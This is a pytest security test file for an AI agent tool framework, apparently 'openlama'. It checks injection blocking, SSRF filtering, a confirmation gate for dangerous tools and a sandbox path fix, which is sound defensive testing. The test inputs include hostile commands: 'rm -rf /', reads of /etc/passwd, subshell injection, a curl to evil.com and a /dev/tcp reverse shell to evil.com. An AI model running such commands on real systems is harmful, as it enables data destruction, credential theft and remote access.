"""Security tests — validates injection prevention, SSRF blocking, confirmation gate, sandbox fixes."""

import asyncio

import pytest

from openlama.tools import init_tools, execute_tool
from openlama.tools.registry import (
    is_dangerous_tool, DANGEROUS_TOOLS, _summarize_args,
)


@pytest.fixture(autouse=True, scope="module")
def _init():
    init_tools()


# ══════════════════════════════════════════════════════════
# 1. Process manager — command injection prevention
# ══════════════════════════════════════════════════════════

class TestProcessManagerInjection:
    """Verify shell metacharacters are blocked in process_manager."""

    @pytest.mark.asyncio
    async def test_kill_rejects_shell_injection_in_target(self):
        """Semicolon in target should be rejected, not executed."""
        result = await execute_tool(
            "process_manager",
            {"action": "kill", "target": "nginx; rm -rf /"},
            0,
        )
        assert "Invalid" in result or "denied" in result.lower()
        assert "rm" not in result.lower() or "Invalid" in result

    @pytest.mark.asyncio
    async def test_kill_rejects_pipe_injection(self):
        result = await execute_tool(
            "process_manager",
            {"action": "kill", "target": "nginx | cat /etc/passwd"},
            0,
        )
        assert "Invalid" in result

    @pytest.mark.asyncio
    async def test_kill_rejects_subshell_injection(self):
        result = await execute_tool(
            "process_manager",
            {"action": "kill", "target": "$(whoami)"},
            0,
        )
        assert "Invalid" in result

    @pytest.mark.asyncio
    async def test_kill_rejects_backtick_injection(self):
        result = await execute_tool(
            "process_manager",
            {"action": "kill", "target": "`whoami`"},
            0,
        )
        assert "Invalid" in result

    @pytest.mark.asyncio
    async def test_kill_valid_pid(self):
        """Valid numeric PID should be accepted (won't find process, but format OK)."""
        result = await execute_tool(
            "process_manager",
            {"action": "kill", "target": "999999", "signal": "TERM"},
            0,
        )
        # Should attempt the kill (process likely doesn't exist)
        assert "Invalid" not in result

    @pytest.mark.asyncio
    async def test_kill_valid_process_name(self):
        """Valid process name should be accepted."""
        result = await execute_tool(
            "process_manager",
            {"action": "kill", "target": "nonexistent-proc", "signal": "TERM"},
            0,
        )
        assert "Invalid" not in result

    @pytest.mark.asyncio
    async def test_kill_rejects_invalid_signal(self):
        result = await execute_tool(
            "process_manager",
            {"action": "kill", "target": "12345", "signal": "TERM; whoami"},
            0,
        )
        assert "Invalid signal" in result

    @pytest.mark.asyncio
    async def test_kill_accepts_valid_signals(self):
        for sig in ("TERM", "KILL", "HUP", "INT", "9", "15"):
            result = await execute_tool(
                "process_manager",
                {"action": "kill", "target": "999999", "signal": sig},
                0,
            )
            assert "Invalid signal" not in result, f"Signal {sig} should be valid"

    @pytest.mark.asyncio
    async def test_lsof_rejects_injection_in_port(self):
        result = await execute_tool(
            "process_manager",
            {"action": "lsof", "target": "8080; cat /etc/passwd"},
            0,
        )
        assert "Invalid" in result

    @pytest.mark.asyncio
    async def test_lsof_accepts_valid_port(self):
        result = await execute_tool(
            "process_manager",
            {"action": "lsof", "target": "8080"},
            0,
        )
        assert "Invalid" not in result

    @pytest.mark.asyncio
    async def test_lsof_accepts_valid_pid(self):
        result = await execute_tool(
            "process_manager",
            {"action": "lsof", "target": "12345"},
            0,
        )
        assert "Invalid" not in result

    @pytest.mark.asyncio
    async def test_ps_rejects_injection_in_flags(self):
        result = await execute_tool(
            "process_manager",
            {"action": "ps", "target": "aux; whoami"},
            0,
        )
        assert "Invalid" in result

    @pytest.mark.asyncio
    async def test_ps_accepts_valid_flags(self):
        result = await execute_tool(
            "process_manager",
            {"action": "ps", "target": "aux"},
            0,
        )
        assert "Invalid" not in result

    @pytest.mark.asyncio
    async def test_fallback_blocked(self):
        """Unknown actions should be rejected entirely."""
        result = await execute_tool(
            "process_manager",
            {"action": "curl", "target": "http://evil.com"},
            0,
        )
        assert "Unknown action" in result

    @pytest.mark.asyncio
    async def test_fallback_blocked_reverse_shell(self):
        result = await execute_tool(
            "process_manager",
            {"action": "bash", "target": "-i >& /dev/tcp/evil.com/4444 0>&1"},
            0,
        )
        assert "Unknown action" in result

    @pytest.mark.asyncio
    async def test_systemctl_rejects_injection(self):
        result = await execute_tool(
            "process_manager",
            {"action": "systemctl", "target": "status nginx; rm -rf /"},
            0,
        )
        assert "Invalid" in result

    @pytest.mark.asyncio
    async def test_systemctl_rejects_unknown_subcommand(self):
        result = await execute_tool(
            "process_manager",
            {"action": "systemctl", "target": "exec bash"},
            0,
        )
        assert "Invalid" in result

    @pytest.mark.asyncio
    async def test_systemctl_valid_status(self):
        result = await execute_tool(
            "process_manager",
            {"action": "systemctl", "target": "status nginx"},
            0,
        )
        assert "Invalid" not in result


# ══════════════════════════════════════════════════════════
# 2. URL fetch — SSRF prevention
# ══════════════════════════════════════════════════════════

class TestURLFetchSSRF:
    """Verify internal/private addresses are blocked."""

    @pytest.mark.asyncio
    async def test_blocks_localhost(self):
        result = await execute_tool("url_fetch", {"url": "http://127.0.0.1/"}, 0)
        assert "Blocked" in result or "private" in result.lower()

    @pytest.mark.asyncio
    async def test_blocks_localhost_name(self):
        result = await execute_tool("url_fetch", {"url": "http://localhost/"}, 0)
        assert "Blocked" in result or "private" in result.lower()

    @pytest.mark.asyncio
    async def test_blocks_metadata_endpoint(self):
        result = await execute_tool("url_fetch", {"url": "http://169.254.169.254/latest/meta-data/"}, 0)
        assert "Blocked" in result or "private" in result.lower()

    @pytest.mark.asyncio
    async def test_blocks_private_10(self):
        result = await execute_tool("url_fetch", {"url": "http://10.0.0.1/"}, 0)
        assert "Blocked" in result or "private" in result.lower()

    @pytest.mark.asyncio
    async def test_blocks_private_172(self):
        result = await execute_tool("url_fetch", {"url": "http://172.16.0.1/"}, 0)
        assert "Blocked" in result or "private" in result.lower()

    @pytest.mark.asyncio
    async def test_blocks_private_192(self):
        result = await execute_tool("url_fetch", {"url": "http://192.168.1.1/"}, 0)
        assert "Blocked" in result or "private" in result.lower()

    @pytest.mark.asyncio
    async def test_blocks_ipv6_loopback(self):
        result = await execute_tool("url_fetch", {"url": "http://[::1]/"}, 0)
        assert "Blocked" in result or "private" in result.lower() or "resolve" in result.lower()

    @pytest.mark.asyncio
    async def test_blocks_zero_ip(self):
        result = await execute_tool("url_fetch", {"url": "http://0.0.0.0/"}, 0)
        assert "Blocked" in result or "private" in result.lower()

    @pytest.mark.asyncio
    async def test_allows_public_ip(self):
        """Public IPs should not be blocked by SSRF filter (may fail for other reasons)."""
        result = await execute_tool("url_fetch", {"url": "http://1.1.1.1/"}, 0)
        assert "Blocked" not in result
        assert "private" not in result.lower()


# ══════════════════════════════════════════════════════════
# 3. Dangerous tool confirmation gate
# ══════════════════════════════════════════════════════════

class TestDangerousToolConfirmation:
    """Verify confirmation mechanism for dangerous tools."""

    def test_dangerous_tools_identified(self):
        assert is_dangerous_tool("shell_command")
        assert is_dangerous_tool("code_execute")
        assert is_dangerous_tool("process_manager")
        assert is_dangerous_tool("file_write")

    def test_safe_tools_not_flagged(self):
        assert not is_dangerous_tool("get_datetime")
        assert not is_dangerous_tool("calculator")
        assert not is_dangerous_tool("web_search")
        assert not is_dangerous_tool("url_fetch")
        assert not is_dangerous_tool("file_read")
        assert not is_dangerous_tool("git")

    def test_summarize_shell_command(self):
        summary = _summarize_args("shell_command", {"command": "rm -rf /"})
        assert "rm -rf /" in summary

    def test_summarize_code_execute(self):
        summary = _summarize_args("code_execute", {"language": "python", "code": "print('hi')"})
        assert "python" in summary
        assert "print" in summary

    def test_summarize_process_manager(self):
        summary = _summarize_args("process_manager", {"action": "kill", "target": "nginx", "signal": "TERM"})
        assert "kill" in summary
        assert "nginx" in summary

    def test_summarize_file_write(self):
        summary = _summarize_args("file_write", {"path": "/tmp/test.txt", "content": "hello", "mode": "write"})
        assert "/tmp/test.txt" in summary

    def test_summarize_truncates_long_code(self):
        long_code = "x" * 500
        summary = _summarize_args("code_execute", {"language": "python", "code": long_code})
        assert len(summary) < 500  # Should be truncated

    @pytest.mark.asyncio
    async def test_confirmation_denied_blocks_execution(self):
        """When confirm_fn returns False, tool should not execute."""
        async def deny_all(name: str, summary: str) -> bool:
            return False

        result = await execute_tool("shell_command", {"command": "echo should_not_run"}, 0, confirm_fn=deny_all)
        assert "denied" in result.lower()
        assert "should_not_run" not in result

    @pytest.mark.asyncio
    async def test_confirmation_approved_allows_execution(self):
        """When confirm_fn returns True, tool should execute normally."""
        async def approve_all(name: str, summary: str) -> bool:
            return True

        result = await execute_tool("shell_command", {"command": "echo confirmation_test"}, 0, confirm_fn=approve_all)
        assert "confirmation_test" in result

    @pytest.mark.asyncio
    async def test_confirmation_not_asked_for_safe_tools(self):
        """Safe tools should execute without calling confirm_fn."""
        called = []

        async def track_confirm(name: str, summary: str) -> bool:
            called.append(name)
            return True

        await execute_tool("get_datetime", {}, 0, confirm_fn=track_confirm)
        assert len(called) == 0, "confirm_fn should not be called for safe tools"

    @pytest.mark.asyncio
    async def test_confirmation_asked_for_dangerous_tools(self):
        """Dangerous tools should trigger confirm_fn."""
        called = []

        async def track_confirm(name: str, summary: str) -> bool:
            called.append(name)
            return True

        await execute_tool("shell_command", {"command": "echo test"}, 0, confirm_fn=track_confirm)
        assert "shell_command" in called

    @pytest.mark.asyncio
    async def test_no_confirm_fn_executes_normally(self):
        """Without confirm_fn, dangerous tools execute normally (backward compat)."""
        result = await execute_tool("shell_command", {"command": "echo no_confirm"}, 0)
        assert "no_confirm" in result

    @pytest.mark.asyncio
    async def test_confirm_fn_exception_denies(self):
        """If confirm_fn raises, tool should be denied."""
        async def broken_confirm(name: str, summary: str) -> bool:
            raise RuntimeError("confirm system broken")

        result = await execute_tool("shell_command", {"command": "echo should_not_run"}, 0, confirm_fn=broken_confirm)
        assert "denied" in result.lower()


# ══════════════════════════════════════════════════════════
# 4. Sandbox path traversal fix
# ══════════════════════════════════════════════════════════

class TestSandboxPathTraversal:
    """Verify sandbox prefix collision fix."""

    def test_rejects_prefix_collision(self, monkeypatch):
        """Path /home/username should NOT match sandbox /home/user."""
        from openlama.utils.sandbox import is_safe_path
        monkeypatch.setattr("openlama.utils.sandbox.get_config_bool", lambda k, d=False: True)
        monkeypatch.setattr("openlama.utils.sandbox.get_config", lambda k: "/allowed/sandbox")
        # This path starts with /allowed/sandbox as a string prefix but is NOT under it
        assert is_safe_path("/allowed/sandboxescape/malicious.txt") is False

    def test_allows_exact_dir(self, monkeypatch):
        """Exact sandbox dir should be allowed."""
        from openlama.utils.sandbox import is_safe_path
        monkeypatch.setattr("openlama.utils.sandbox.get_config_bool", lambda k, d=False: True)
        monkeypatch.setattr("openlama.utils.sandbox.get_config", lambda k: "/tmp")
        assert is_safe_path("/tmp") is True

    def test_allows_subpath(self, monkeypatch):
        """Path under sandbox should be allowed."""
        from openlama.utils.sandbox import is_safe_path
        monkeypatch.setattr("openlama.utils.sandbox.get_config_bool", lambda k, d=False: True)
        monkeypatch.setattr("openlama.utils.sandbox.get_config", lambda k: "/tmp")
        assert is_safe_path("/tmp/file.txt") is True

    def test_rejects_outside_path(self, monkeypatch):
        from openlama.utils.sandbox import is_safe_path
        monkeypatch.setattr("openlama.utils.sandbox.get_config_bool", lambda k, d=False: True)
        monkeypatch.setattr("openlama.utils.sandbox.get_config", lambda k: "/allowed/sandbox")
        assert is_safe_path("/etc/passwd") is False


# ══════════════════════════════════════════════════════════
# 5. SSRF validation function unit tests
# ══════════════════════════════════════════════════════════

class TestSSRFValidation:
    """Unit tests for the SSRF validation logic."""

    def test_is_private_ip_loopback(self):
        from openlama.tools.url_fetch import _is_private_ip
        assert _is_private_ip("127.0.0.1") is True
        assert _is_private_ip("127.0.0.2") is True

    def test_is_private_ip_private_ranges(self):
        from openlama.tools.url_fetch import _is_private_ip
        assert _is_private_ip("10.0.0.1") is True
        assert _is_private_ip("172.16.0.1") is True
        assert _is_private_ip("192.168.1.1") is True

    def test_is_private_ip_link_local(self):
        from openlama.tools.url_fetch import _is_private_ip
        assert _is_private_ip("169.254.169.254") is True

    def test_is_private_ip_public(self):
        from openlama.tools.url_fetch import _is_private_ip
        assert _is_private_ip("8.8.8.8") is False
        assert _is_private_ip("1.1.1.1") is False

    def test_validate_url_host_blocks_localhost(self):
        from openlama.tools.url_fetch import _validate_url_host
        result = _validate_url_host("http://127.0.0.1/")
        assert result is not None
        assert "private" in result.lower() or "Blocked" in result

    def test_validate_url_host_allows_public(self):
        from openlama.tools.url_fetch import _validate_url_host
        result = _validate_url_host("https://example.com/")
        assert result is None  # None means safe

    def test_validate_url_host_no_hostname(self):
        from openlama.tools.url_fetch import _validate_url_host
        result = _validate_url_host("not-a-url")
        # Should return some error (no hostname or cannot resolve)
        assert result is not None


# ══════════════════════════════════════════════════════════
# 6. Process manager — functional correctness preserved
# ══════════════════════════════════════════════════════════

class TestProcessManagerFunctional:
    """Ensure security hardening doesn't break legitimate usage."""

    @pytest.mark.asyncio
    async def test_uptime_works(self):
        result = await execute_tool("process_manager", {"action": "uptime"}, 0)
        assert "up" in result.lower() or "load" in result.lower()

    @pytest.mark.asyncio
    async def test_df_works(self):
        result = await execute_tool("process_manager", {"action": "df"}, 0)
        assert "Filesystem" in result or "/" in result

    @pytest.mark.asyncio
    async def test_sysinfo_works(self):
        result = await execute_tool("process_manager", {"action": "sysinfo"}, 0)
        assert "OS" in result

    @pytest.mark.asyncio
    async def test_ps_works(self):
        result = await execute_tool("process_manager", {"action": "ps"}, 0)
        assert "PID" in result or "pid" in result or "exit code: 0" in result

    @pytest.mark.asyncio
    async def test_free_works(self):
        result = await execute_tool("process_manager", {"action": "free"}, 0)
        assert "Memory" in result or "free" in result.lower() or "vm_stat" in result.lower() or "exit code" in result

    @pytest.mark.asyncio
    async def test_top_works(self):
        result = await execute_tool("process_manager", {"action": "top"}, 0)
        assert "exit code" in result or "Load" in result or "PID" in result

    @pytest.mark.asyncio
    async def test_empty_action_returns_help(self):
        result = await execute_tool("process_manager", {"action": ""}, 0)
        assert "specify" in result.lower() or "action" in result.lower()
